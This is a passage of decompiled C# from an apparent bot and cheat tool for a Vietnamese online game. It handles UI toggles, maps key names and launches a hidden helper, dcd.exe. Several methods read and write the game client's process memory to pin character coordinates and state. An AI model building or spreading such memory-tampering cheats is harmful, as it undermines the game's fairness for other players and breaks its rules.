						MessageBox.Show("Không tìm thấy cửa sổ game của tài khoản: " + string_50, "Lỗi", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
						checkBoxFixtoadolag.Checked = false;
					}
					else
					{
						int_150 = 0;
						richTextBoxStatus.Text = "Bật chức năng Fix lag Tọa ĐỘ TK: " + string_50;
					}
				}
				else
				{
					int_150 = 0;
					string_50 = string.Empty;
					intptr_1 = IntPtr.Zero;
					richTextBoxStatus.Text = "tắt chức năng Fix lag Tọa ĐỘ TK";
				}
			}
			else if (checkBoxFixtoadolag.Checked)
			{
				MessageBox.Show("chọn 1 tài khoản sau đó tick vào.", "Lỗi", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
				checkBoxFixtoadolag.Checked = false;
			}
		}
		else if (checkBoxFixtoadolag.Checked)
		{
			MessageBox.Show("Kchọn 1 tài khoản sau đó tick vào.", "Lỗi", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
			checkBoxFixtoadolag.Checked = false;
		}
	}

	private IntPtr method_40(string string_69)
	{
		if (characterAccountConfig_1 != null)
		{
			for (int i = 0; i < characterAccountConfig_1.Length; i++)
			{
				if (characterAccountConfig_1[i].string_22 == null || !(Class1.smethod_1(characterAccountConfig_1[i].string_22, 1) == string_69))
				{
					continue;
				}
				try
				{
					Process processById = Process.GetProcessById(characterAccountConfig_1[i].int_136);
					if (processById != null && !processById.HasExited)
					{
						return processById.MainWindowHandle;
					}
				}
				catch
				{
				}
			}
		}
		return IntPtr.Zero;
	}

	private void method_41()
	{
		try
		{
			using RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\\AutoVL\\Settings");
			registryKey?.SetValue("SettingB", string_63 ?? string.Empty);
		}
		catch (Exception)
		{
		}
	}

	private void method_42()
	{
		try
		{
			using RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\AutoVL\\Settings");
			if (registryKey == null)
			{
				return;
			}
			string value = registryKey.GetValue("SettingB")?.ToString();
			if (!string.IsNullOrEmpty(value))
			{
				string_63 = value;
				if (lenh2 != null)
				{
					lenh2.Text = value;
				}
			}
		}
		catch (Exception)
		{
		}
	}

	private string method_43(string string_69)
	{
		if (string.IsNullOrEmpty(string_69))
		{
			return string_69;
		}
		string text = string_69.ToUpper().Trim();
		string text2 = text;
        uint num = ComputeStringHash(text2);
        if (num <= 462935941)
		{
			switch (num)
			{
			case 215134355u:
				if (text2 == "F8")
				{
					return "{F8}";
				}
				break;
			case 198356736u:
				if (text2 == "F9")
				{
					return "{F9}";
				}
				break;
			case 57309092u:
				if (text2 == "CTRL")
				{
					return "^";
				}
				break;
			case 280545358u:
				if (text2 == "HOME")
				{
					return "{HOME}";
				}
				break;
			case 272375920u:
				if (text2 == "LEFT")
				{
					return "{LEFT}";
				}
				break;
			case 366132926u:
				if (text2 == "F3")
				{
					return "{F3}";
				}
				break;
			case 332577688u:
				if (text2 == "F1")
				{
					return "{F1}";
				}
				break;
			case 399688164u:
				if (text2 == "F5")
				{
					return "{F5}";
				}
				break;
			case 382910545u:
				if (text2 == "F2")
				{
					return "{F2}";
				}
				break;
			case 416465783u:
				if (text2 == "F4")
				{
					return "{F4}";
				}
				break;
			case 403239141u:
				if (text2 == "SPACE")
				{
					return " ";
				}
				break;
			case 450021021u:
				if (text2 == "F6")
				{
					return "{F6}";
				}
				break;
			case 433243402u:
				if (text2 == "F7")
				{
					return "{F7}";
				}
				break;
			case 462935941u:
				if (text2 == "RIGHT")
				{
					return "{RIGHT}";
				}
				break;
			case 456382828u:
				if (text2 == "TAB")
				{
					return "{TAB}";
				}
				break;
			}
		}
		else if (num <= 3044644013u)
		{
			if (num <= 1602699974)
			{
				if (num <= 686750334)
				{
					switch (num)
					{
					case 686750334u:
						if (text2 == "PAGEDOWN")
						{
							return "{PGDN}";
						}
						break;
					case 651557717u:
						if (text2 == "DOWN")
						{
							return "{DOWN}";
						}
						break;
					}
				}
				else if (num != 1566678716)
				{
					if (num == 1602699974 && text2 == "ESCAPE")
					{
						goto IL_04dd;
					}
				}
				else if (text2 == "ALT")
				{
					return "%";
				}
			}
			else
			{
				switch (num)
				{
				case 2767009640u:
					if (text2 == "INSERT")
					{
						return "{INS}";
					}
					break;
				case 1660128160u:
					if (text2 == "UP")
					{
						return "{UP}";
					}
					break;
				case 3044644013u:
					if (text2 == "ENTER")
					{
						return "{ENTER}";
					}
					break;
				case 2940441098u:
					if (text2 == "END")
					{
						return "{END}";
					}
					break;
				}
			}
		}
		else if (num <= 3736956062u)
		{
			switch (num)
			{
			case 3703400824u:
				if (text2 == "F10")
				{
					return "{F10}";
				}
				break;
			case 3161116647u:
				if (text2 == "SHIFT")
				{
					return "+";
				}
				break;
			case 3736956062u:
				if (text2 == "F12")
				{
					return "{F12}";
				}
				break;
			case 3720178443u:
				if (text2 == "F11")
				{
					return "{F11}";
				}
				break;
			}
		}
		else if (num <= 3931159262u)
		{
			if (num != 3795410475u)
			{
				if (num == 3931159262u && text2 == "ESC")
				{
					goto IL_04dd;
				}
			}
			else if (text2 == "PAGEUP")
			{
				return "{PGUP}";
			}
		}
		else
		{
			switch (num)
			{
			case 4168191690u:
				if (text2 == "DELETE")
				{
					return "{DEL}";
				}
				break;
			case 3978442060u:
				if (text2 == "BACKSPACE")
				{
					return "{BACKSPACE}";
				}
				break;
			}
		}
		return string_69;
		IL_04dd:
		return "{ESC}";
	}

    private static uint ComputeStringHash(string s)
    {
        uint num = 2166136261u;
        if (s != null)
        {
            for (int i = 0; i < s.Length; i++)
            {
                num = (s[i] ^ num) * 16777619u;
            }
        }
        return num;
    }
    private void method_44()
	{
		try
		{
			CharacterAccountConfig? characterAccountConfig = null;
			if (characterAccountConfig_1 != null)
			{
				for (int i = 0; i < characterAccountConfig_1.Length; i++)
				{
					if (characterAccountConfig_1[i].string_22 == null || !(Class1.smethod_1(characterAccountConfig_1[i].string_22, 1) == string_50))
					{
						continue;
					}
					try
					{
						Process processById = Process.GetProcessById(characterAccountConfig_1[i].int_136);
						if (processById != null && !processById.HasExited)
						{
							characterAccountConfig = characterAccountConfig_1[i];
							intptr_1 = processById.MainWindowHandle;
							break;
						}
					}
					catch
					{
					}
				}
			}
			if (!characterAccountConfig.HasValue)
			{
				richTextBoxStatus.Text = "Tài khoản " + string_50 + " đã bị đóng. Dừng chức năng.";
				checkBoxFixtoadolag.Checked = false;
				return;
			}
			uint num = Class24.smethod_30(Class56.memorySignatureScanConfig_11.uint_0, characterAccountConfig.Value.int_137);
			if (num != 0)
			{
				uint num2 = Class24.smethod_30(num + Class56.memorySignatureScanConfig_13.uint_0, characterAccountConfig.Value.int_137);
				uint num3 = Class24.smethod_30(Class56.memorySignatureScanConfig_14.uint_0, characterAccountConfig.Value.int_137);
				uint num4 = num3 + num2 * Class56.memorySignatureScanConfig_15.uint_0;
				int num5 = (int)Class24.smethod_30(num4 + Class56.memorySignatureScanConfig_55.uint_0, characterAccountConfig.Value.int_137);
				if (num5 > 0 && num5 <= 3 && Class24.smethod_30(num4 + Class56.memorySignatureScanConfig_44.uint_0, characterAccountConfig.Value.int_137) == 0)
				{
					Class75.smethod_57(characterAccountConfig.Value, "Switch([[sit]])");
				}
			}
		}
		catch (Exception)
		{
			checkBoxFixtoadolag.Checked = false;
		}
	}

	private void textBoxIDSudung_TextChanged(object sender, EventArgs e)
	{
	}

	private void tocbien_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				try
				{
					if (tocbien.Checked)
					{
						if (!bool_1)
						{
							if (!Initialize())
							{
								tocbien.Checked = false;
								return;
							}
							bool_1 = true;
						}
						Start(2);
						MessageBox.Show("Đã bắt đầu chức năng TỐC BIẾN NGỒI (Mode 2).", "Thông báo", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
					}
					else
					{
						Stop();
						Cleanup();
						bool_1 = false;
					}
					return;
				}
				catch (DllNotFoundException)
				{
					tocbien.Checked = false;
					return;
				}
				catch (Exception ex2)
				{
					MessageBox.Show("Lỗi không xác định: " + ex2.Message, "Lỗi", MessageBoxButtons.OK, MessageBoxIcon.Hand);
					tocbien.Checked = false;
					return;
				}
			}
			if (tocbien.Checked)
			{
				MessageBox.Show("chọn 1 tài khoản sau đó tick vào.", "Lỗi", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
				tocbien.Checked = false;
			}
		}
		else if (tocbien.Checked)
		{
			MessageBox.Show("chọn 1 tài khoản sau đó tick vào.", "Lỗi", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
			tocbien.Checked = false;
		}
	}

	private void method_45(string string_69)
	{
		try
		{
			_ = $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss.fff}] {string_69}";
		}
		catch
		{
		}
	}

	private void method_46()
	{
		try
		{
		}
		catch
		{
		}
	}

	private void tabPage3_Click(object sender, EventArgs e)
	{
	}

	private void listViewTrain_SelectedIndexChanged(object sender, EventArgs e)
	{
	}

	private void method_47(object sender, EventArgs e)
	{
	}

	private void method_48(object sender, EventArgs e)
	{
	}

	private void method_49(object sender, EventArgs e)
	{
		try
		{
			TextBox obj = sender as TextBox;
			object obj2;
			if (obj == null)
			{
				obj2 = null;
			}
			else
			{
				obj2 = obj.Text;
				if (obj2 != null)
				{
					goto IL_001d;
				}
			}
			obj2 = string.Empty;
			goto IL_001d;
			IL_001d:
			string_62 = (string)obj2;
		}
		catch
		{
			string_62 = string.Empty;
		}
	}

	private void listView1_SelectedIndexChanged(object sender, EventArgs e)
	{
		method_50();
	}

	private void method_50()
	{
		if (!timer_3.Enabled || !bool_23)
		{
			return;
		}
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num >= 0)
		{
			bool flag = characterAccountConfig_1[num].int_144 > 0 || characterAccountConfig_1[num].int_143 == 1;
			checkBox2.Checked = flag;
			if (characterAccountConfig_1[num].int_143 == 1 && characterAccountConfig_1[num].int_144 == 0)
			{
				characterAccountConfig_1[num].int_144 = 1;
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
			buttonTuyChonMonPhai.Enabled = checkBox2.Checked;
		}
	}

	private void checkBox2_CheckedChanged(object sender, EventArgs e)
	{
		buttonTuyChonMonPhai.Enabled = checkBox2.Checked;
		if (!checkBox2.Checked && (comboBoxUuTien.Text == "Ngũ hành" || comboBoxUuTien.Text == "Môn phái"))
		{
			comboBoxUuTien.Text = "Khoảng cách";
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_88 = 0;
				characterAccountConfig_1[num].int_143 = 0;
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
		if (timer_3.Enabled && bool_23)
		{
			int num2 = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num2 >= 0)
			{
				characterAccountConfig_1[num2].int_144 = Convert.ToByte(checkBox2.Checked);
				characterAccountConfig_1[num2].bool_11 = true;
				Class56.smethod_13(characterAccountConfig_1[num2]);
			}
		}
	}

	private void buttonTuyChonMonPhai_Click(object sender, EventArgs e)
	{
		if (!checkBox2.Checked)
		{
			MessageBox.Show("Vui lòng tick vào checkbox 'Ngũ hành' trước khi sử dụng chức năng này!", "Thông báo", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}
		else if (FormUutienNguHanh.int_0 <= 0)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				try
				{
					FormUutienNguHanh.int_0 = characterAccountConfig_1[num].int_136;
					FormUutienNguHanh.string_0 = Class83.smethod_18(characterAccountConfig_1[num]);
					FormUutienNguHanh formUutienNguHanh = new FormUutienNguHanh();
					formUutienNguHanh.int_1 = base.Left;
					formUutienNguHanh.int_2 = base.Top;
					formUutienNguHanh.Show();
					return;
				}
				catch
				{
					MessageBox.Show("Không thể mở form ưu tiên ngũ hành!", "Lỗi", MessageBoxButtons.OK, MessageBoxIcon.Hand);
					return;
				}
			}
			MessageBox.Show("Vui lòng chọn một tài khoản trước!", "Thông báo", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
		}
		else
		{
			FormUutienNguHanh.int_0 = 0;
		}
	}

	private CharacterAccountConfig? method_51()
	{
		int selectedIndex = comboBoxAccChinh.SelectedIndex;
		if (selectedIndex >= 0 && selectedIndex < characterAccountConfig_1.Length)
		{
			return characterAccountConfig_1[selectedIndex];
		}
		return null;
	}

	private CharacterAccountConfig? method_52()
	{
		if (comboBoxAccChinh.InvokeRequired)
		{
			try
			{
				return (CharacterAccountConfig?)comboBoxAccChinh.Invoke((Func<CharacterAccountConfig?>)(() => method_51()));
			}
			catch
			{
				return null;
			}
		}
		return method_51();
	}

	private bool method_53(CharacterAccountConfig? nullable_0)
	{
		if (!nullable_0.HasValue)
		{
			return false;
		}
		int num = Class38.smethod_27(nullable_0.Value);
		return num > 0;
	}

	private void method_54()
	{
		if (class18_0 != null)
		{
			return;
		}
		class18_0 = new Class18(listViewTrain, method_52, (CharacterAccountConfig account) => Class38.smethod_30(account), (CharacterAccountConfig account) => Class38.smethod_27(account), delegate
		{
			CharacterAccountConfig? nullable_ = method_52();
			if (!method_53(nullable_))
			{
				if (!bool_3)
				{
					bool_3 = true;
				}
				return false;
			}
			bool_3 = false;
			return true;
		}, delegate(string string_69)
		{
			try
			{
				CharacterAccountConfig? characterAccountConfig = method_52();
				if (characterAccountConfig.HasValue)
				{
					Class75.smethod_52(characterAccountConfig.Value, string_69);
				}
			}
			catch
			{
			}
		}, (CharacterAccountConfig account) => Class39.smethod_0(account), delegate
		{
			if (toadotk.InvokeRequired)
			{
				toadotk.Invoke((Action)delegate
				{
					toadotk.Checked = false;
				});
			}
			else
			{
				toadotk.Checked = false;
			}
		});
	}

	private bool method_55()
	{
		if (!toadotk.Checked)
		{
			return false;
		}
		if (int_24 != 1)
		{
			return false;
		}
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num >= 0 && characterAccountConfig_1[num].bool_25)
		{
			if (!method_51().HasValue)
			{
				return false;
			}
			if (listViewTrain.Items != null && listViewTrain.Items.Count != 0)
			{
				return true;
			}
			return false;
		}
		return false;
	}

	private void method_56()
	{
		if (!method_55())
		{
			toadotk.Checked = false;
			return;
		}
		method_54();
		if (!class18_0.method_0())
		{
			try
			{
				CharacterAccountConfig? characterAccountConfig = method_52();
				if (characterAccountConfig.HasValue)
				{
					Class75.smethod_52(characterAccountConfig.Value, "<bclr=blue><color=white>Kh«ng thÓ khëi ®éng ch¹y to¹ ®é: thiÕu vÞ trÝ hiÖn t¹i hoÆc tuyÕn rçng.");
				}
			}
			catch
			{
			}
			toadotk.Checked = false;
			return;
		}
		toadotk.Text = "Đang chạy tọa độ TK";
		try
		{
			method_52();
		}
		catch
		{
		}
	}

	private void toadotk_CheckedChanged(object sender, EventArgs e)
	{
		if (!toadotk.Checked)
		{
			class18_0?.method_1();
			toadotk.Text = "Tự Chạy Tọa Độ";
		}
		else
		{
			if (!timer_3.Enabled || !bool_23)
			{
				return;
			}
			if (int_24 != 1)
			{
				if (toadotk.Checked)
				{
					MessageBox.Show("Chức năng này chỉ sử dụng được khi chọn chế độ Tống Kim (TK).", "Lỗi", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
					toadotk.Checked = false;
				}
			}
			else
			{
				if (!toadotk.Checked)
				{
					return;
				}
				int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
				if (num >= 0 && characterAccountConfig_1[num].bool_25)
				{
					BeginInvoke((Action)delegate
					{
						method_56();
					});
				}
				else
				{
					MessageBox.Show("Vui lòng chọn và tick vào một tài khoản trong danh sách trước!", "Thông báo", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
					toadotk.Checked = false;
				}
			}
		}
	}

	private uint method_57(uint[] uint_5, uint[] uint_6)
	{
		if (uint_5 != null && uint_6 != null && uint_5.Length >= 2 && uint_6.Length >= 2)
		{
			long num = (long)uint_5[0] - (long)uint_6[0];
			long num2 = (long)uint_5[1] - (long)uint_6[1];
			return (uint)(num * num + num2 * num2);
		}
		return uint.MaxValue;
	}

	private void method_58(CharacterAccountConfig characterAccountConfig_2, uint uint_5, uint uint_6)
	{
		try
		{
			uint num = Class38.smethod_1(characterAccountConfig_2);
			Class24.smethod_31(num + Class56.memorySignatureScanConfig_57.uint_0 + Class56.memorySignatureScanConfig_58.uint_0, characterAccountConfig_2.int_137, uint_5);
			Class24.smethod_31(num + Class56.memorySignatureScanConfig_57.uint_0 + Class56.memorySignatureScanConfig_59.uint_0, characterAccountConfig_2.int_137, uint_6);
		}
		catch (Exception ex)
		{
			richTextBoxStatus.Text = "Lỗi khi ổn định vị trí: " + ex.Message;
		}
	}

	private void method_59(CharacterAccountConfig characterAccountConfig_2, int int_159)
	{
		try
		{
			uint num = Class38.smethod_1(characterAccountConfig_2);
			Class24.smethod_31(num + Class56.memorySignatureScanConfig_55.uint_0, characterAccountConfig_2.int_137, (uint)int_159);
		}
		catch (Exception ex)
		{
			richTextBoxStatus.Text = "Lỗi khi đặt trạng thái: " + ex.Message;
		}
	}

	private string method_60(int int_159)
	{
		if (int_159 >= 0 && int_159 < Class56.string_24.Length)
		{
			return Class56.string_24[int_159];
		}
		return $"Unknown({int_159})";
	}

	private void lenh1_TextChanged(object sender, EventArgs e)
	{
		try
		{
			TextBox obj = sender as TextBox;
			object obj2;
			if (obj == null)
			{
				obj2 = null;
			}
			else
			{
				obj2 = obj.Text;
				if (obj2 != null)
				{
					goto IL_001d;
				}
			}
			obj2 = string.Empty;
			goto IL_001d;
			IL_001d:
			string_62 = (string)obj2;
		}
		catch
		{
			string_62 = string.Empty;
		}
	}

	private void lenh2_TextChanged(object sender, EventArgs e)
	{
		try
		{
			TextBox obj = sender as TextBox;
			object obj2;
			if (obj == null)
			{
				obj2 = null;
			}
			else
			{
				obj2 = obj.Text;
				if (obj2 != null)
				{
					goto IL_001d;
				}
			}
			obj2 = string.Empty;
			goto IL_001d;
			IL_001d:
			string_63 = (string)obj2;
		}
		catch
		{
			string_63 = string.Empty;
		}
		method_41();
	}

	private void lenh3_TextChanged(object sender, EventArgs e)
	{
		try
		{
			TextBox obj = sender as TextBox;
			object obj2;
			if (obj == null)
			{
				obj2 = null;
			}
			else
			{
				obj2 = obj.Text;
				if (obj2 != null)
				{
					goto IL_001d;
				}
			}
			obj2 = string.Empty;
			goto IL_001d;
			IL_001d:
			string_64 = (string)obj2;
		}
		catch
		{
			string_64 = string.Empty;
		}
	}

	private void lenh4_TextChanged(object sender, EventArgs e)
	{
		try
		{
			TextBox obj = sender as TextBox;
			object obj2;
			if (obj == null)
			{
				obj2 = null;
			}
			else
			{
				obj2 = obj.Text;
				if (obj2 != null)
				{
					goto IL_001d;
				}
			}
			obj2 = string.Empty;
			goto IL_001d;
			IL_001d:
			string_65 = (string)obj2;
		}
		catch
		{
			string_65 = string.Empty;
		}
	}

	private void lenh5_TextChanged(object sender, EventArgs e)
	{
		try
		{
			TextBox obj = sender as TextBox;
			object obj2;
			if (obj == null)
			{
				obj2 = null;
			}
			else
			{
				obj2 = obj.Text;
				if (obj2 != null)
				{
					goto IL_001d;
				}
			}
			obj2 = string.Empty;
			goto IL_001d;
			IL_001d:
			string_66 = (string)obj2;
		}
		catch
		{
			string_66 = string.Empty;
		}
	}

	private void lenh6_TextChanged(object sender, EventArgs e)
	{
		try
		{
			TextBox obj = sender as TextBox;
			object obj2;
			if (obj == null)
			{
				obj2 = null;
			}
			else
			{
				obj2 = obj.Text;
				if (obj2 != null)
				{
					goto IL_001d;
				}
			}
			obj2 = string.Empty;
			goto IL_001d;
			IL_001d:
			string_67 = (string)obj2;
		}
		catch
		{
			string_67 = string.Empty;
		}
	}

	private void lenh7_TextChanged(object sender, EventArgs e)
	{
		try
		{
			TextBox obj = sender as TextBox;
			object obj2;
			if (obj == null)
			{
				obj2 = null;
			}
			else
			{
				obj2 = obj.Text;
				if (obj2 != null)
				{
					goto IL_001d;
				}
			}
			obj2 = string.Empty;
			goto IL_001d;
			IL_001d:
			string_68 = (string)obj2;
		}
		catch
		{
			string_68 = string.Empty;
		}
	}

	private void caidatlenh_Click(object sender, EventArgs e)
	{
		if (string.IsNullOrEmpty(comboBoxAccChinh.Text))
		{
			MessageBox.Show("Vui lòng chọn account chính trước khi sử dụng chức năng này!");
			return;
		}
		try
		{
			string text = ((lenh1 == null || string.IsNullOrEmpty(lenh1.Text)) ? string_62 : lenh1.Text);
			string text2 = ((lenh2 == null || string.IsNullOrEmpty(lenh2.Text)) ? string_63 : lenh2.Text);
			string text3 = ((lenh3 == null || string.IsNullOrEmpty(lenh3.Text)) ? string_64 : lenh3.Text);
			string text4 = ((lenh4 == null || string.IsNullOrEmpty(lenh4.Text)) ? string_65 : lenh4.Text);
			string text5 = ((lenh5 == null || string.IsNullOrEmpty(lenh5.Text)) ? string_66 : lenh5.Text);
			string text6 = ((lenh6 == null || string.IsNullOrEmpty(lenh6.Text)) ? string_67 : lenh6.Text);
			string baseDirectory = AppDomain.CurrentDomain.BaseDirectory;
			string text7 = null;
			try
			{
				string text8 = baseDirectory;
				for (int i = 0; i < 6; i++)
				{
					string text9 = Path.Combine(text8, "Release");
					string path = Path.Combine(text9, "dcd.exe");
					if (!Directory.Exists(text9) || !File.Exists(path))
					{
						string text10 = Directory.GetParent(text8)?.FullName;
						if (string.IsNullOrEmpty(text10))
						{
							break;
						}
						text8 = text10;
						continue;
					}
					text7 = text9;
					break;
				}
				if (text7 == null)
				{
					string text11 = Path.Combine(baseDirectory, "Release");
					if (Directory.Exists(text11))
					{
						text7 = text11;
					}
				}
			}
			catch
			{
			}
			if (string.IsNullOrEmpty(text7))
			{
				text7 = Path.Combine(baseDirectory, "Release");
			}
			if (!Directory.Exists(text7))
			{
				Directory.CreateDirectory(text7);
			}
			string path2 = Path.Combine(text7, "setting.txt");
			string[] contents = new string[6]
			{
				"A = " + text,
				"B = " + text2,
				"C = " + text3,
				"D = " + text4,
				"E = " + text5,
				"F = " + text6
			};
			File.WriteAllLines(path2, contents);
			string text12 = comboBoxAccChinh.Text;
			if (!string.IsNullOrEmpty(text12) && characterAccountConfig_1 != null)
			{
				for (int j = 0; j < characterAccountConfig_1.Length; j++)
				{
					if (characterAccountConfig_1[j].string_22 == null || !(Class1.smethod_1(characterAccountConfig_1[j].string_22, 1) == text12))
					{
						continue;
					}
					try
					{
						Process processById = Process.GetProcessById(characterAccountConfig_1[j].int_136);
						if (processById != null && !processById.HasExited)
						{
							IntPtr mainWindowHandle = processById.MainWindowHandle;
							if (mainWindowHandle != IntPtr.Zero)
							{
								SetForegroundWindow(mainWindowHandle);
							}
						}
					}
					catch
					{
					}
					break;
				}
			}
			string text13 = Path.Combine(text7, "dcd.exe");
			if (File.Exists(text13))
			{
				try
				{
					ProcessStartInfo startInfo = new ProcessStartInfo
					{
						FileName = text13,
						WorkingDirectory = text7,
						UseShellExecute = false,
						CreateNoWindow = true
					};
					Process.Start(startInfo);
					return;
				}
				catch (Exception ex)
				{
					MessageBox.Show("Lỗi khi chạy dcd.exe: " + ex.Message);
					return;
				}
			}
			MessageBox.Show("Không tìm thấy dcd.exe trong thư mục: " + text7);
		}
		catch (Exception ex2)
		{
			MessageBox.Show("Có lỗi xảy ra: " + ex2.Message);
		}
	}

	private void button2_Click(object sender, EventArgs e)
	{
		if (string.IsNullOrEmpty(comboBoxAccChinh.Text))
		{
			MessageBox.Show("Vui lòng chọn account chính trước khi sử dụng chức năng này!");
			return;
		}
		try
		{
			string text = ((lenh7 == null || string.IsNullOrEmpty(lenh7.Text)) ? string_68 : lenh7.Text);
			string baseDirectory = AppDomain.CurrentDomain.BaseDirectory;
			string text2 = null;
			try
			{
				string text3 = baseDirectory;
				for (int i = 0; i < 6; i++)
				{
					string text4 = Path.Combine(text3, "Release");
					string path = Path.Combine(text4, "dcd.exe");
					if (!Directory.Exists(text4) || !File.Exists(path))
					{
						string text5 = Directory.GetParent(text3)?.FullName;
						if (string.IsNullOrEmpty(text5))
						{
							break;
						}
						text3 = text5;
						continue;
					}
					text2 = text4;
					break;
				}
				if (text2 == null)
				{
					string text6 = Path.Combine(baseDirectory, "Release");
					if (Directory.Exists(text6))
					{
						text2 = text6;
					}
				}
			}
			catch
			{
			}
			if (string.IsNullOrEmpty(text2))
			{
				text2 = Path.Combine(baseDirectory, "Release");
			}
			if (!Directory.Exists(text2))
			{
				Directory.CreateDirectory(text2);
			}
			string path2 = Path.Combine(text2, "setting.txt");
			Dictionary<string, string> dictionary = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
			try
			{
				if (File.Exists(path2))
				{
					string[] array = File.ReadAllLines(path2);
					foreach (string text7 in array)
					{
						if (!string.IsNullOrWhiteSpace(text7) && text7.Contains("="))
						{
							int num = text7.IndexOf('=');
							if (num > 0)
							{
								string key = text7.Substring(0, num).Trim();
								string value = text7.Substring(num + 1).Trim();
								dictionary[key] = value;
							}
						}
					}
				}
			}
			catch
			{
			}
			dictionary["Q"] = text ?? string.Empty;
			string[] contents = new string[7]
			{
				"A = " + (dictionary.ContainsKey("A") ? dictionary["A"] : string.Empty),
				"B = " + (dictionary.ContainsKey("B") ? dictionary["B"] : string.Empty),
				"C = " + (dictionary.ContainsKey("C") ? dictionary["C"] : string.Empty),
				"D = " + (dictionary.ContainsKey("D") ? dictionary["D"] : string.Empty),
				"E = " + (dictionary.ContainsKey("E") ? dictionary["E"] : string.Empty),
				"F = " + (dictionary.ContainsKey("F") ? dictionary["F"] : string.Empty),
				"Q = " + (dictionary.ContainsKey("Q") ? dictionary["Q"] : string.Empty)
			};
			File.WriteAllLines(path2, contents);
			string text8 = comboBoxAccChinh.Text;
			if (!string.IsNullOrEmpty(text8) && characterAccountConfig_1 != null)
			{
				for (int k = 0; k < characterAccountConfig_1.Length; k++)
				{
					if (characterAccountConfig_1[k].string_22 == null || !(Class1.smethod_1(characterAccountConfig_1[k].string_22, 1) == text8))
					{
						continue;
					}
					try
					{
						Process processById = Process.GetProcessById(characterAccountConfig_1[k].int_136);
						if (processById != null && !processById.HasExited)
						{
							IntPtr mainWindowHandle = processById.MainWindowHandle;
							if (mainWindowHandle != IntPtr.Zero)
							{
								SetForegroundWindow(mainWindowHandle);
							}
						}
					}
					catch
					{
					}
					break;
				}
			}
			string text9 = Path.Combine(text2, "dcd.exe");
			if (File.Exists(text9))
			{
				try
				{
					ProcessStartInfo startInfo = new ProcessStartInfo
					{
						FileName = text9,
						WorkingDirectory = text2,
						UseShellExecute = false,
						CreateNoWindow = true
					};
					Process.Start(startInfo);
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
		catch (Exception)
		{
		}
	}

	private void linkLabel3_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
	{
		string fileName = "https://www.facebook.com/share/p/18w1wjUDoF/";
		Process.Start(fileName);
	}

	private void hienthithongke_CheckedChanged(object sender, EventArgs e)
	{
		if (hienthithongke.Checked)
		{
			bool flag = false;
			if (Class81.characterAccountConfig_0.int_136 > 0 && characterAccountConfig_1 != null)
			{
				int num = Class87.smethod_3(characterAccountConfig_1, Class81.characterAccountConfig_0.int_136);
				if (num >= 0 && characterAccountConfig_1[num].bool_25)
				{
					flag = true;
				}
			}
			if (!flag && characterAccountConfig_1 != null)
			{
				int num2 = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
				if (num2 >= 0 && characterAccountConfig_1[num2].bool_25)
				{
					flag = true;
				}
			}
			if (!flag)
			{
				hienthithongke.Checked = false;
				return;
			}
			int_50 = 0;
			dateTime_1 = DateTime.Now;
		}
		else
		{
			int_50 = 0;
		}
	}

	private void method_61()
	{
		try
		{
			int num = Class87.smethod_3(characterAccountConfig_1, Class81.characterAccountConfig_0.int_136);
			if (num < 0)
			{
				num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
				if (num < 0)
				{
					hienthithongke.Checked = false;
					FormTip.smethod_0(string_49, "Không tìm thấy tài khoản nào để thống kê, đã tắt thống kê tự động.", 600000, 200, 120);
					return;
				}
			}
			if (!characterAccountConfig_1[num].bool_25)
			{
				hienthithongke.Checked = false;
				return;
			}
			if (characterAccountConfig_1[num].uint_17 == 0)
			{
				characterAccountConfig_1[num].uint_18 = 0u;
				characterAccountConfig_1[num].uint_17 = Class24.smethod_1(characterAccountConfig_1[num].int_137);
				if (characterAccountConfig_1[num].uint_17 == 0)
				{
					return;
				}
				Class75.smethod_8(ref characterAccountConfig_1[num]);
			}
			Class49 @class = new Class49();
			@class.characterAccountConfig_0 = characterAccountConfig_1[num];
			@class.string_0 = null;
			new Thread(@class.method_2).Start();
		}
		catch (Exception)
		{
		}
	}

	private void timequaylai_TextChanged(object sender, EventArgs e)
	{
		try
		{
			if (int.TryParse(timequaylai.Text, out var result))
			{
				int_128 = result * 60 * 1000;
				Class66.smethod_11(Class66.smethod_1(), "ThoiGianChoThoDiaPhu", result.ToString(), "", 0);
			}
			else
			{
				int_128 = 0;
				Class66.smethod_11(Class66.smethod_1(), "ThoiGianChoThoDiaPhu", "0", "", 0);
			}
		}
		catch
		{
			int_128 = 0;
			Class66.smethod_11(Class66.smethod_1(), "ThoiGianChoThoDiaPhu", "0", "", 0);
		}
	}

	private void baodskenhbang_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int_129 = Convert.ToByte(baodskenhbang.Checked);
			Class66.smethod_11(Class66.smethod_1(), "flagBaoDSKenhBang", int_129, "", 0);
			try
			{
				_ = $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] DEBUG: Checkbox baodskenhbang thay đổi - Checked: {baodskenhbang.Checked}, int_151: {int_129}\n";
			}
			catch
			{
